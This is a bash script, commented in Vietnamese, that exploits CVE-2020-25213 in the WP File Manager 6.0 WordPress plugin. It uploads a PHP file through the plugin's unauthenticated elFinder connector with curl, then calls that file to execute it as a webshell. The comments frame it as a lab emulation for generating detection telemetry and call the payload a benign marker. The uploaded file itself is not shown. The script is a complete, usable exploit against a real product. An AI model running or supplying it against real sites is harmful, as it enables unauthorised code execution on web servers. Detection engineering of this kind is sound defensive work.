#!/usr/bin/env bash
# v1_upload_webshell.sh — V1: file upload → webshell qua WP File Manager 6.0.
#   CVE-2020-25213 (unauth arbitrary file upload).
#
# Chạy từ máy ATTACKER trong lab:
#     bash v1_upload_webshell.sh http://<victim>
#
# Đây là EMULATION của CVE công khai: dùng chính elFinder connector mà plugin
# phơi ra (lệnh `upload` không xác thực) để ghi payload lab (lab-marker.php) vào
# wp-content/plugins/wp-file-manager/lib/files/, rồi gọi nó để sinh chokepoint
# `apache2(www-data) → sh`. Payload là marker recon lành tính (xem lab-marker.php).
set -euo pipefail
BASE="${1:?Usage: $0 http://<victim>}"
BASE="${BASE%/}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD="$HERE/lab-marker.php"
NAME="labshell_$(date +%s).php"

# Endpoint connector của plugin (đường dẫn đã công bố trong CVE).
CONN="$BASE/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

echo "[*] V1 / CVE-2020-25213 → $CONN"
echo "[*] Upload payload lab: $NAME"

# elFinder nhận cmd=upload, target gốc (l1_...), file[]=multipart.
HTTP=$(curl -s -o /tmp/v1_resp.json -w '%{http_code}' \
  -F "cmd=upload" \
  -F "target=l1_Lw" \
  -F "upload[]=@${PAYLOAD};filename=${NAME};type=application/x-php" \
  "$CONN" || true)
echo "[*] connector HTTP $HTTP"; cat /tmp/v1_resp.json 2>/dev/null | head -c 400; echo

# Vị trí file sau upload (lib/files/).
SHELL_URL="$BASE/wp-content/plugins/wp-file-manager/lib/files/${NAME}"
echo "[*] Gọi payload để sinh telemetry: $SHELL_URL"
curl -s "$SHELL_URL" | sed 's/^/    /'

cat <<EOF

[i] Kỳ vọng telemetry trên victim:
      auditd execve: apache2 (www-data) -> sh -> id/uname/whoami/hostname
      access log   : POST .../connector.minimal.php , GET .../files/${NAME}
      -> forward lên index=lab_web
[i] Dọn: xoá wp-content/plugins/wp-file-manager/lib/files/${NAME} trên victim
    (hoặc revert snapshot).
EOF
